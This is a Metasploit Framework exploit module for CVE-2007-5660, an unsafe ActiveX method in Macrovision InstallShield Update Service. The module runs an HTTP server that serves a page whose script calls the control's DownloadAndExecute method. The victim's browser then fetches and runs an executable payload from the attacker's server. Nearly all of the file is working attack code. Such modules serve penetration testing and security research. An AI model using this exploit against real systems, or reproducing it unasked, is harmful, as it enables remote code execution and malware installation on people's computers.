##
# $Id: macrovision_unsafe.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Macrovision InstallShield Update Service ActiveX Unsafe Method',
			'Description'    => %q{
				This module allows attackers to execute code via an unsafe methods in Macrovision InstallShield 2008.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2007-5660' ],
					[ 'OSVDB', '38347' ],
					[ 'BID', '26280' ],
				],
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 20 2007'))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		payload_url =  "http://"
		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/payload"

		if (request.uri.match(/payload/))
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })
			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		vname  = rand_text_alpha(rand(100) + 1)
		exe    = rand_text_alpha(rand(20) + 1)

		content = %Q|
			<html>
				<object classid='clsid:E9880553-B8A7-4960-A668-95C68BED571E' id='#{vname}'></object>
				<script language='JavaScript'>
					#{vname}.Initialize("#{vname}","#{vname}","","");
					#{vname}.DownloadAndExecute("","",1,"#{payload_url}/#{exe}.exe","");
					#{vname}.DownloadAndInstall("True");
				</script>
			</html>
						|

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)

		handler(cli)

	end

end
